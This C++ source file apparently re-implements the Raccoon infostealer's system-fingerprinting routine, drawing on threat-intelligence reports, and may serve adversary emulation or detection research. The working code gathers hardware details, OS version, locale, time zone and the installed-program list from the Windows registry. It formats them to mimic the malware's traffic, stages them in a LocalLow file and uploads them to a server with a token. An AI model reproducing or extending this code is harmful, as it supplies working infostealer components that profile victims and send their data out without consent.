#pragma once
#include "fingerprint.h"

/**
* Gathers the requisite system information and formats it into
* a file (System Info.txt, per CTI), then sends it to the server
*
* Sources:
* - Sekoia
* - AnyRun
*/
int fingerprint() {
    // Gather the data
    wstring dim = getScreenSize();
    vector<wstring> adapters = getDisplayAdapters();
    wstring arch = getArchitecture();
    wstring mem = getTotalMemory();
    wstring tz = getTimeZone();
    wstring os = getOSVersion();
    wstring proc = getProcessorInfo();
    wstring locale = getUserLocale();
    vector<wstring> programs = getInstalledPrograms();

    // Format per the CTI network traffic
    wstring formatted = formatSystemInfo(dim, adapters, arch, mem, tz, os, proc, locale, programs);

    // Write this to file for exfil
    wstring path = g_localLowPath + g_stagingFolder + g_systemInfoFilePath;
    writeToFile(formatted, path);

    // Upload
    vector<char> fileBytes = readBytesFromFile(path);
    int res = sendMultipartUpload(fileBytes, g_systemInfoUploadName, g_token);

    return res;
}

/** 
* Returns a formatted string of WidthxHeight
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getScreenSize() {
    int width = g_racGetSystemMetrics(SM_CXSCREEN);
    int height = g_racGetSystemMetrics(SM_CYSCREEN);
    wstring dim = to_wstring(width) + g_xChar + to_wstring(height);

    return dim;
}

/** 
* Returns all identified ACTIVE adapters
* 
* Sources:
* - Sekoia
* - AnyRun
*/
vector<wstring> getDisplayAdapters() {
    vector<wstring> adapters;
    int deviceNum = 0;
    PDISPLAY_DEVICEW pAdapterStruct = new DISPLAY_DEVICEW();
    pAdapterStruct->cb = sizeof(DISPLAY_DEVICE);

    while (g_racEnumDisplayDevicesW(NULL, deviceNum, pAdapterStruct, EDD_GET_DEVICE_INTERFACE_NAME)) {
        if (pAdapterStruct->StateFlags & DISPLAY_DEVICE_ACTIVE)
            adapters.push_back(wstring(pAdapterStruct->DeviceString));
        deviceNum++;
        pAdapterStruct->cb = sizeof(DISPLAY_DEVICE);
    }

    delete pAdapterStruct;
    return adapters;
}

/**
* Returns the CPU architecture
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getArchitecture() {
    DWORD lastError = g_racGetSystemWow64DirectoryW(0, 0);
    if (lastError == 0) {
        lastError = g_racGetLastError();
        if (lastError == ERROR_CALL_NOT_IMPLEMENTED) {
            return g_x86;
        }
    }

    return g_x64;
}

/**
* Returns the total available physical memory
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getTotalMemory() {
    MEMORYSTATUSEX statex;
    int bytes;

    statex.dwLength = sizeof(statex);
    g_racGlobalMemoryStatusEx(&statex);

    bytes = statex.ullTotalPhys / 1000000;
    return wstring(to_wstring(bytes) + g_MB);
}

/**
* Returns the time zone
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getTimeZone() {
    TIME_ZONE_INFORMATION ptzi;
    int res;

    res = g_racGetTimeZoneInformation(&ptzi);

    switch (res) {
    case 1:
        return wstring(ptzi.StandardName);
    case 2:
        return wstring(ptzi.DaylightName);
    default:
        return g_unknownLiteral;
    }
}

/**
* Returns the OS version name
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getOSVersion() {
    LSTATUS result;
    HKEY hKey;
    wchar_t pData[512];
    DWORD cbData = sizeof(pData);
    wstring version(g_osError);

    result = g_racRegOpenKeyExW(HKEY_LOCAL_MACHINE, g_regCurrentVersion.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);

    if (result == ERROR_SUCCESS) {
        result = g_racRegQueryValueExW(hKey, g_productNameKey.c_str(), NULL, NULL, (LPBYTE)pData, &cbData);
        if (result == ERROR_SUCCESS) {
            version = pData;
        }
    }

    RegCloseKey(hKey);

    return version;
}

/**
* Returns the processor vendor name (not type)
* CTI discussed the use of __cpuid. The referenced calls have been implemented
* in a class (CPUID.h) to simplify the calls within this function.
* 
* This method simply gathers the values of the 4 registers after the special
* __cpuid call which places the vendor information in them if called with 0
* 
* Sources:
* - Sekoia
* - AnyRun
* 
*/
wstring getProcessorInfo() {
    CPUID cpuInfo(0);
    wstring processorInfo(g_processorError);

    // This code gets Intel vs. AMD, not what Raccoon does but leaving
    // it for later notes
    /*string vendorA;
    vendorA += string((const char *)&cpuInfo.EBX(), 4);
    vendorA += string((const char *)&cpuInfo.EDX(), 4);
    vendorA += string((const char *)&cpuInfo.ECX(), 4);
    */

    // Grab the model string
    string modelA;
    for (int i = 0x80000002; i < 0x80000005; ++i) {
        CPUID cpuInfo(i);
        modelA += string((const char*)&cpuInfo.EAX(), 4);
        modelA += string((const char*)&cpuInfo.EBX(), 4);
        modelA += string((const char*)&cpuInfo.ECX(), 4);
        modelA += string((const char*)&cpuInfo.EDX(), 4);
    }

    // Convert to wstring
    wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    wstring modelW = converter.from_bytes(modelA);

    // While you can get cores through the above method
    // Raccoon uses a different API
    SYSTEM_INFO sysInfo;
    int cores;

    g_racGetSystemInfo(&sysInfo);
    cores = (int)sysInfo.dwNumberOfProcessors;

    processorInfo = modelW + g_spaceChar + g_leftParen + to_wstring(cores) + g_coresWithParen;

    return processorInfo;
}

/**
* Returns the user's locale in long form (i.e., not en-us --> English (United States))
* Consistent with CTI using GetLocaleInfo. The queried value within the returned
* struct was unclear, however the output of LOCALE_SNATIVEDISPLAYNAME matches
* the network traffic in intelligence.
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring getUserLocale() {
    wstring localeString = g_localeError;
    LCID locale;
    wchar_t localeData[512];

    locale = g_racGetUserDefaultLCID();
    g_racGetLocaleInfoW(locale, LOCALE_SNATIVEDISPLAYNAME, localeData, sizeof(localeData) / sizeof(TCHAR));
    localeString = wstring(localeData);

    return localeString;
}

/**
* Returns a list of installed programs from the registry \\Uninstall key
* Consistent with CTI, though an additional permission was needed for
* the first RegOpenKeyExW to allow enumeration of sub keys that wasn't
* shown in the CTI
* 
* Sources:
* - Sekoia
* - AnyRun
*/
vector<wstring> getInstalledPrograms() {
    LSTATUS keyOpenRes;
    LSTATUS subKeyRes;
    HKEY hKey;
    vector<wstring> programListing;

    // Open with KEY_ENUMERATE_SUB_KEYS to enable next call
    keyOpenRes = g_racRegOpenKeyExW(HKEY_LOCAL_MACHINE, g_regUninstall.c_str(), 0, KEY_READ | KEY_WOW64_64KEY | KEY_ENUMERATE_SUB_KEYS, &hKey);

    // Check reg open success
    if (keyOpenRes == ERROR_SUCCESS) {
        int idx = 0;

        // Loop over subkeys until empty
        do {
            wchar_t pSubKeyName[510];
            DWORD cbSubKeyName = sizeof(pSubKeyName);
            wchar_t pDisplayName[512];
            wchar_t pDisplayVersion[512];
            DWORD cbData = sizeof(pDisplayName);
            HKEY hSubKey;
            wstring entry;

            // Enum the next sub key
            subKeyRes = g_racRegEnumKeyExW(hKey, idx, pSubKeyName, &cbSubKeyName, NULL, NULL, NULL, NULL);

            // Check for success... kinda dumb since it's checked at the end with while
            // but a straight while loop wasn't working because the vars holding data were
            // getting mangled if they weren't reset
            if (subKeyRes == ERROR_SUCCESS) {
                // Open the sub key
                keyOpenRes = g_racRegOpenKeyExW(hKey, pSubKeyName, 0, KEY_READ | KEY_WOW64_64KEY, &hSubKey);

                if (keyOpenRes == ERROR_SUCCESS) {
                    // Get the display name
                    keyOpenRes = g_racRegQueryValueExW(hSubKey, g_displayNameKey.c_str(), NULL, NULL, (LPBYTE)pDisplayName, &cbData);
                    if (keyOpenRes == ERROR_SUCCESS) {
                        entry += pDisplayName;

                        // Get the version if a display name was found
                        keyOpenRes = g_racRegQueryValueExW(hSubKey, g_displayVersionKey.c_str(), NULL, NULL, (LPBYTE)pDisplayVersion, &cbData);
                        if (keyOpenRes == ERROR_SUCCESS) {
                            entry += L" - " + wstring(pDisplayVersion);
                        }
                        programListing.push_back(entry);
                    }

                    // Close the subkey
                    g_racRegCloseKey(hSubKey);
                }
            }
            idx++;

        } while (subKeyRes == ERROR_SUCCESS);


        g_racRegCloseKey(hKey);

    }

    return programListing;
}

/**
* Returns a formatted string that matches the format found in CTI network traffic
* 
* Sources:
* - Sekoia
* - AnyRun
*/
wstring formatSystemInfo(wstring dim, vector<wstring> adapters, wstring arch,
    wstring mem, wstring tz, wstring os, wstring proc,
    wstring locale, vector<wstring> programs) {

    // System Information block
    wstring result = g_systemInfoFormat + g_newLineChar;
    result += g_indent + g_localeFormat + locale + g_newLineChar;
    result += g_indent + g_timeZoneFormat + tz + g_newLineChar;
    result += g_indent + g_archFormat + arch + g_newLineChar;
    result += g_indent + g_cpuFormat + proc + g_newLineChar;
    result += g_indent + g_ramFormat + mem + g_newLineChar;
    result += g_indent + g_displaySizeFormat + dim + g_newLineChar;
    result += g_indent + g_displayDevicesFormat + g_newLineChar;
    for (int i = 0; i < adapters.size(); i++) {
        result += g_indent2 + to_wstring(i) + g_rightParen + adapters[i] + g_newLineChar;
    }

    // Installed apps block
    result += g_newLineChar + g_installedAppsFormat + g_newLineChar;
    for (int i = 0; i < programs.size(); i++) {
        result += g_indent + programs[i] + g_newLineChar;
    }

    return result;
}